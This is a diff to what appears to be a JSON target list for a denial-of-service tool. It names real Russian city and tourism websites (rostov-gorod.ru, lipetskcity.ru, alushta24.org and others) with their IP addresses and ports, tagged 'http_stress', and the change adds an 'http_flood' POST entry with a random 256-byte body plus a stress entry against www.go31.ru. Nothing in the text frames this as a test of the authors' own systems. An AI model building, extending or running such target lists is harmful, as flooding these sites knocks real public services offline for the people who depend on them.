@@ -10,5 +10,7 @@
   {"kind":"http_stress","method":"GET","ip":"45.130.41.77","port": 443, "url": "https://alushta24.org/"},
   {"kind":"http_stress","method":"GET","ip":"87.117.26.124","port": 443, "url": "https://tourism.rostov-gorod.ru/"},
   {"kind":"http_stress","method":"GET","ip":"87.117.26.92","port": 443, "url": "https://rostov-gorod.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"89.108.105.30","port": 443, "url": "https://lipetskcity.ru"}
+  {"kind":"http_stress","method":"GET","ip":"89.108.105.30","port": 443, "url": "https://lipetskcity.ru"},
+  {"kind":"http_flood","method":"POST","ip":"188.124.42.163","port": 443, "url": "https://www.go31.ru/", "headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
+  {"kind":"http_stress","method":"GET","ip":"188.124.42.163","port": 443, "url": "https://www.go31.ru/"}
 ]
